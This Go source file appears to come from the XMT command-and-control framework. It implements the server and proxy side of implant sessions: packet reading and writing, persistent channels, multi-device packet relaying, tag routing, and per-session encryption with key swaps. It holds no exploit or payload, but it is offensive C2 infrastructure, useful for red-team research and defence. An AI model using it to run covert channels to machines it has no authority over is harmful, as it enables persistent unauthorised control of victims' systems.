//go:build !implant || !noproxy

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"errors"
	"net"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// ErrMalformedPacket is an error returned by various Packet reading
// functions when a Packet is attempted to be passed that is nil or invalid.
//
// Invalid Packets are packets that do not have a proper ID value or contain
// an empty device ID.
var ErrMalformedPacket = xerr.Sub("empty or nil Packet", 0x46)

var _ connHost = (*Session)(nil)

type conn struct {
	key  *data.Key
	host connHost
	next *com.Packet
	subs map[uint32]bool
	add  []*com.Packet
	lock uint32
}
type connHost interface {
	chanWake()
	keyCheck()
	keyRevert()
	name() string
	update(string)
	chanWakeClear()
	chanStop() bool
	stateSet(uint32)
	chanStart() bool
	stateUnset(uint32)
	chanRunning() bool
	keyValue() *data.Key
	clientID() device.ID
	next(bool) *com.Packet
	deadlineRead() time.Time
	deadlineWrite() time.Time
	sender() chan *com.Packet
}
type connServer interface {
	clientLock()
	clientUnlock()
	prefix() string
	wrapper() Wrapper
	clientClear(uint32)
	transform() Transform
	clientGet(uint32) (connHost, bool)
	clientSet(uint32, chan *com.Packet)
	notify(connHost, *com.Packet) error
	talk(string, *com.Packet) (*conn, error)
	talkSub(string, *com.Packet, bool) (connHost, uint32, *com.Packet, error)
}

func (c *conn) close() {
	if c.next != nil {
		c.next.Clear()
	}
	c.add, c.next, c.subs = nil, nil, nil
}
func (s *Session) chanWake() {
	if s.state.WakeClosed() || len(s.wake) >= cap(s.wake) {
		return
	}
	select {
	case s.wake <- wake:
	default:
	}
}
func (s *Session) chanWakeClear() {
	if s.state.WakeClosed() {
		return
	}
	for len(s.wake) > 0 {
		<-s.wake
	}
}
func (s *Session) chanStop() bool {
	return s.state.ChannelCanStop()
}
func (s *Session) update(a string) {
	s.Last = time.Now()
	s.host.Set(a)
}
func (s *Session) chanStart() bool {
	return !s.isMoving() && s.state.ChannelCanStart()
}
func (s *Session) stateSet(v uint32) {
	s.state.Set(v)
}
func (s *Session) chanRunning() bool {
	return s.state.Channel()
}
func (s *Session) stateUnset(v uint32) {
	s.state.Unset(v)
}
func (s *Session) keyValue() *data.Key {
	return &s.key
}
func (s *Session) clientID() device.ID {
	return s.ID
}
func (*Session) deadlineWrite() time.Time {
	return empty
}
func (s *Session) deadlineRead() time.Time {
	if s.sleep > 0 {
		return time.Now().Add(s.sleep * sleepMod)
	}
	return empty
}
func (s *Session) sender() chan *com.Packet {
	return s.send
}
func (c *conn) stop(h connServer, x net.Conn) {
	switch i := atomic.LoadUint32(&c.lock); i {
	case 0:
	case 1:
		atomic.AddUint32(&c.lock, 1)
		c.host = nil
		return
	default:
		return
	}
	x.SetDeadline(time.Now().Add(-time.Second))
	x.Close()
	atomic.AddUint32(&c.lock, 1)
	c.host.stateUnset(stateChannel)
	c.host.chanWake()
	h.clientLock()
	for i := range c.subs {
		h.clientClear(i)
	}
	h.clientUnlock()
}
func handle(l *cout.Log, c net.Conn, h connServer, a string) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.handle()")
		bugtrack.Track("c2.handle(): a=%s, h=%T, attempting to read a Packet.", a, h)
	}
	n, err := readPacket(c, h.wrapper(), h.transform())
	if err != nil {
		if c.Close(); cout.Enabled {
			l.Error("[%s] %s: Error reading Packet: %s!", h.prefix(), a, err)
		}
		return
	}
	if n.Flags&com.FlagOneshot != 0 {
		if cout.Enabled {
			l.Debug("[%s:%s] %s: Received an Oneshot Packet.", h.prefix(), n.Device, a)
		}
		// KeyCrypt: Should NOT be encrypted here.
		if err = h.notify(nil, n); err != nil {
			if cout.Enabled {
				l.Warning("[%s:%s] %s: Error processing Oneshot: %s!", h.prefix(), n.Device, a, err)
			}
		}
		return
	}
	if cout.Enabled {
		l.Debug("[%s:%s] %s: Received Packet %q (non-channel).", h.prefix(), n.Device, a, n)
	}
	// KeyCrypt: Packet 'n' is decrypted here.
	v, err := h.talk(a, n)
	if err != nil {
		if c.Close(); cout.Enabled {
			l.Error("[%s:%s] %s: Error processing Packet: %s!", h.prefix(), n.Device, a, err)
		}
		return
	}
	// KeyCrypt: Crypt next outgoing Packet.
	v.next.Crypt(v.key)
	if err := writePacket(c, h.wrapper(), h.transform(), v.next); err != nil {
		if c.Close(); cout.Enabled {
			l.Error("[%s:%s] %s: Error writing Packet: %s!", h.prefix(), v.next.Device, a, err)
		}
		return
	}
	switch v.next.Clear(); {
	case n.Flags&com.FlagChannel != 0 || v.next.Flags&com.FlagChannel != 0:
	case v.host == nil:
		fallthrough
	case !v.host.chanStart():
		c.Close()
		v.close()
		v = nil
		return
	}
	v.next = nil
	v.start(l, h, c, a)
	c.Close()
	v.close()
	v = nil
}
func (c *conn) start(l *cout.Log, h connServer, x net.Conn, a string) {
	h.clientLock()
	for i := range c.subs {
		h.clientSet(i, c.host.sender())
	}
	h.clientUnlock()
	c.host.stateSet(stateChannel)
	c.host.chanWakeClear()
	go c.channelRead(l, h, a, x)
	c.channelWrite(l, h, a, x)
	c.stop(h, x)
}
func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.conn.channelRead()")
	}
	if cout.Enabled {
		l.Info("[%s:%s:S->C:R] %s: Started Channel reader.", h.prefix(), c.host.name(), a)
	}
	for x.SetReadDeadline(c.host.deadlineRead()); c.host.chanRunning(); x.SetReadDeadline(c.host.deadlineRead()) {
		n, err := readPacket(x, h.wrapper(), h.transform())
		if err != nil {
			if cout.Enabled {
				l.Error("[%s:%s:S->C:R] %s: Error reading next wire Packet: %s!", h.prefix(), c.host.name(), a, err)
			}
			break
		}
		// KeyCrypt: Decrypt incoming Packet here.
		if n.Crypt(c.key); cout.Enabled {
			l.Debug("[%s:%s:S->C:R] %s: Received a Packet %q.", h.prefix(), c.host.name(), a, n)
		}
		if err = c.resolve(l, c.host, h, a, n.Tags, true); err != nil {
			if cout.Enabled {
				l.Error("[%s:%s:S->C:R] %s: Error processing Packet data: %s!", h.prefix(), c.host.name(), a, err)
			}
			break
		}
		if err = c.process(l, h, a, n, true); err != nil {
			if cout.Enabled {
				l.Error("[%s:%s:S->C:R] %s: Error processing Packet data: %s!", h.prefix(), c.host.name(), a, err)
			}
			break
		}
		if !c.host.chanRunning() {
			if cout.Enabled {
				l.Info("[%s:%s:S->C:R] Session/Packet indicated channel close!", h.prefix(), c.host.name())
			}
			break
		}
		if c.host.update(a); n.Flags&com.FlagChannelEnd != 0 || c.host.chanStop() {
			if cout.Enabled {
				l.Info("[%s:%s:S->C:R] Session/Packet indicated channel close!", h.prefix(), c.host.name())
			}
			break
		}
	}
	if cout.Enabled {
		l.Info("[%s:%s:S->C:R] Closed Channel reader.", h.prefix(), c.host.name())
	}
	c.stop(h, x)
}
func (c *conn) channelWrite(l *cout.Log, h connServer, a string, x net.Conn) {
	if cout.Enabled {
		l.Info("[%s:%s:S->C:W] %s: Started Channel writer.", h.prefix(), c.host.name(), a)
	}
	for x.SetReadDeadline(c.host.deadlineWrite()); c.host.chanRunning(); x.SetReadDeadline(c.host.deadlineWrite()) {
		n := c.host.next(false)
		if n == nil {
			if cout.Enabled {
				l.Info("[%s:%s:S->C:W] Session indicated channel close!", h.prefix(), c.host.name())
			}
			break
		}
		if c.host.chanStop() {
			n.Flags |= com.FlagChannelEnd
		}
		// KeyCrypt: Encrypt outgoing Packet.
		if n.Crypt(c.key); cout.Enabled {
			l.Debug("[%s:%s:S->C:W] %s: Sending Packet %q.", h.prefix(), c.host.name(), a, n)
		}
		// KeyCrypt: "next" was called, check for a Key Swap.
		if err := writePacket(x, h.wrapper(), h.transform(), n); err != nil {
			if n.Clear(); cout.Enabled {
				if errors.Is(err, net.ErrClosed) {
					l.Info("[%s:%s:S->C:W] %s: Write channel socket closed.", h.prefix(), c.host.name(), a)
				} else {
					l.Error("[%s:%s:S->C:W] %s: Error attempting to write Packet: %s!", h.prefix(), c.host.name(), a, err)
				}
			}
			// KeyCrypt: Revert key exchange as send failed.
			c.host.keyRevert()
			break
		}
		// KeyCrypt: "next" was called, check for a Key Swap.
		c.host.keyCheck()
		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || c.host.chanStop() {
			if cout.Enabled {
				l.Info("[%s:%s:S->C:W] Session/Packet indicated channel close!", h.prefix(), c.host.name())
			}
			break
		}
	}
	if cout.Enabled {
		l.Info("[%s:%s:S->C:W] Closed Channel writer.", h.prefix(), c.host.name())
	}
}
func (c *conn) process(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
	if n.Flags&com.FlagMultiDevice != 0 {
		if err := c.processMultiple(l, h, a, n, o); err != nil {
			return err
		}
	} else {
		if err := c.processSingle(l, h, a, n, o); err != nil {
			return err
		}
	}
	if o {
		if c.host.chanStop() || n.Flags&com.FlagChannelEnd != 0 {
			if c.host.stateUnset(stateChannel); cout.Enabled {
				l.Debug("[%s:%s] %s: Beaking Channel on next send..", h.prefix(), c.host.name(), a)
			}
		}
		return nil
	}
	if c.next == nil {
		if len(c.add) > 0 {
			c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
		} else {
			c.next = &com.Packet{Device: c.host.clientID()}
		}
	}
	if cout.Enabled {
		l.Debug("[%s:%s] %s: Queuing result %q.", h.prefix(), c.host.name(), a, c.next)
	}
	if len(c.add) > 0 {
		if cout.Enabled {
			l.Trace("[%s:%s] %s: Resolved Tags added %d Packets!", h.prefix(), c.host.name(), a, len(c.add))
		}
		for i := range c.add {
			if c.add[i].Device.Empty() {
				c.next.Clear()
				return ErrMalformedPacket
			}
			if err := writeUnpack(c.next, c.add[i], true, true); err != nil {
				if c.add[i].Clear(); cout.Enabled {
					l.Warning("[%s:%s] %s: Ignoring an inalid Multi Packet: %s!", h.prefix(), c.host.name(), a, err)
				}
				c.next.Clear()
				return err
			}
			c.add[i] = nil
		}
		c.add = nil
	}
	if (c.next.Flags&com.FlagMulti != 0 || c.next.Flags&com.FlagFrag != 0) && c.next.Flags.Len() == 0 {
		c.next.ID, c.next.Flags = 0, 0
	}
	if !c.host.chanRunning() && (c.host.chanStart() || n.Flags&com.FlagChannel != 0) {
		if c.next.Flags |= com.FlagChannel; cout.Enabled {
			l.Debug("[%s:%s] %s: Setting Channel flag on next Packet %q.", h.prefix(), c.host.name(), a, c.next)
		}
	}
	return nil
}
func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
	if err := h.notify(c.host, n); err != nil {
		if cout.Enabled {
			l.Error("[%s:%s] %s: Error processing Packet: %s!", h.prefix(), c.host.name(), a, err)
		}
		return err
	}
	if o {
		return nil
	}
	v := c.host.next(false)
	if len(c.add) > 0 {
		c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
		if v != nil {
			// KeyCrypt: Encrypt packet before packing.
			v.Crypt(c.key)
			err := writeUnpack(c.next, v, true, true)
			if v = nil; err != nil {
				if cout.Enabled {
					l.Error("[%s:%s] %s: Error packing Packet response: %s!", h.prefix(), c.host.name(), a, err)
				}
			}
			// KeyCrypt: "next" was called (result was non-nil), check for a Key Swap.
			c.host.keyCheck()
			return nil
		}
		return nil
	}
	c.next = v
	return nil
}
func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
	x := n.Flags.Len()
	if x == 0 {
		if n.Clear(); cout.Enabled {
			l.Error("[%s:%s/M] %s: Received an invalid Multi Packet!", h.prefix(), c.host.name(), a)
		}
		return ErrInvalidPacketCount
	}
	if c.subs == nil {
		c.subs = make(map[uint32]bool)
	}
	c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
	for ; x > 0; x-- {
		v := new(com.Packet)
		if err := v.UnmarshalStream(n); err != nil {
			n.Clear()
			if c.next.Clear(); cout.Enabled {
				l.Error("[%s:%s/M] %s: Error reading a lower level Packet: %s!", h.prefix(), c.host.name(), a, err)
			}
			return err
		}
		if v.Device.Empty() {
			n.Clear()
			if c.next.Clear(); cout.Enabled {
				l.Error("[%s:%s/M] %s: Received a malformed Packet from a Multi Packet!", h.prefix(), c.host.name(), a)
			}
			return ErrMalformedPacket
		}
		if cout.Enabled {
			l.Debug("[%s:%s/M] %s: Unpacked a Packet %q.", h.prefix(), c.host.name(), a, v.String())
		}
		if len(v.Tags) > 0 {
			if v.Tags = nil; cout.Enabled {
				l.Warning("[%s:%s/M] %s: Received a non-top level Packet with Tags, clearing them!", h.prefix(), v.Device, a)
			}
		}
		if v.Flags&com.FlagMulti != 0 || v.Flags&com.FlagMultiDevice != 0 {
			if v.Clear(); cout.Enabled {
				l.Warning("[%s:%s/M] %s: Ignoring a Multi Packet inside a Multi Packet!", h.prefix(), v.Device, a)
			}
			continue
		}
		if v.Flags&com.FlagOneshot != 0 {
			if cout.Enabled {
				l.Debug("[%s:%s/M] %s: Received an Oneshot Packet %q.", h.prefix(), v.Device, a, v)
			}
			if err := h.notify(c.host, v); err != nil {
				if cout.Enabled {
					l.Warning("[%s:%s/M] %s: Error processing Oneshot Packet: %s!", h.prefix(), v.Device, a, err)
				}
			}
			continue
		}
		if c.host.clientID() == v.Device {
			// KeyCrypt: Decrypt packet for us here.
			v.Crypt(c.key)
			if err := h.notify(c.host, v); err != nil {
				if cout.Enabled {
					l.Warning("[%s:%s/M] %s: Error processing Packet: %s!", h.prefix(), v.Device, a, err)
				}
			}
			if o {
				continue
			}
			// KeyCrypt: Don't call next until the end of the loop, as there may
			//           be packets encrypted with the old key still in queue.
			z := c.host.next(false)
			// KeyCrypt: Encrypt next Packet. If this happens to be a rekey,
			//           it will pass before and affect all after with the new key
			//           This seems really buggy, but since it happens ONLY on the
			//           Server/Proxy end, it should be ok. BUG(dij): for marking
			//           just in case ^_^.
			z.Crypt(c.key)
			err := writeUnpack(c.next, z, true, true)
			if z = nil; err != nil {
				if c.next.Clear(); cout.Enabled {
					l.Error("[%s:%s/M] %s: Error packing Packet response: %s!", h.prefix(), v.Device, a, err)
				}
			}
			continue
		}
		// KeyCrypt: Packet "r" is already encrypted here.
		k, q, r, err := h.talkSub(a, v, o)
		if err != nil {
			if c.next.Clear(); cout.Enabled {
				l.Error("[%s:%s/M] %s: Error reading Session Packet: %s!", h.prefix(), v.Device, a, err)
			}
			return err
		}
		if k != nil {
			c.subs[q] = true
		}
		if o || r == nil {
			continue
		}
		err = writeUnpack(c.next, r, true, true)
		if r.Clear(); err != nil {
			if c.next.Clear(); cout.Enabled {
				l.Error("[%s:%s/M] %s: Error packing Packet response: %s!", h.prefix(), v.Device, a, err)
			}
			return err
		}
	}
	// KeyCrypt: "next" was called, check for a Key Swap.
	c.host.keyCheck()
	n.Clear()
	return nil
}
func (c *conn) resolve(l *cout.Log, s connHost, h connServer, a string, t []uint32, o bool) error {
	if h.clientLock(); c.subs == nil {
		c.subs = make(map[uint32]bool, len(t))
	} else {
		for i := range c.subs {
			c.subs[i] = false
		}
	}
	for i := range t {
		if t[i] == 0 {
			h.clientUnlock()
			return com.ErrMalformedTag
		}
		if i > com.PacketMaxTags {
			if cout.Enabled {
				l.Warning("[%s:%s] %s: Hit tag max limit (%d) while processing tags!", h.prefix(), s.name(), a, com.PacketMaxTags)
			}
			break
		}
		if d, ok := c.subs[t[i]]; ok && d {
			if cout.Enabled {
				l.Warning("[%s:%s] %s: Skipping a duplicate Tag %d:0x%X!", h.prefix(), s.name(), a, i, t[i])
			}
			continue
		}
		if cout.Enabled {
			l.Trace("[%s:%s] %s: Received a Tag %d:0x%X..", h.prefix(), s.name(), a, i, t[i])
		}
		v, ok := h.clientGet(t[i])
		if !ok {
			if cout.Enabled {
				l.Warning("[%s:%s] %s: Received an invalid Tag %d:0x%X!", h.prefix(), s.name(), a, i, t[i])
			}
			continue
		}
		if v.clientID() == s.clientID() {
			continue
		}
		v.update(a)
		if c.subs[t[i]] = true; o {
			continue
		}
		if n := v.next(true); n != nil {
			// KeyCrypt: Encrypt this new Packet.
			n.Crypt(v.keyValue())
			c.add = append(c.add, n)
			// KeyCrypt: "next" was called, check for a Key Swap.
			//           This is a tag, which is server side only, so I doubt
			//           a swap will happen here. BUG(dij): Tag incase also ^_^.
			v.keyCheck()
		}
	}
	if !o {
		h.clientUnlock()
		return nil
	}
	for i := range c.subs {
		if !c.subs[i] {
			h.clientClear(i)
			delete(c.subs, i)
		}
	}
	for i := range c.subs {
		h.clientSet(i, c.host.sender())
	}
	h.clientUnlock()
	return nil
}
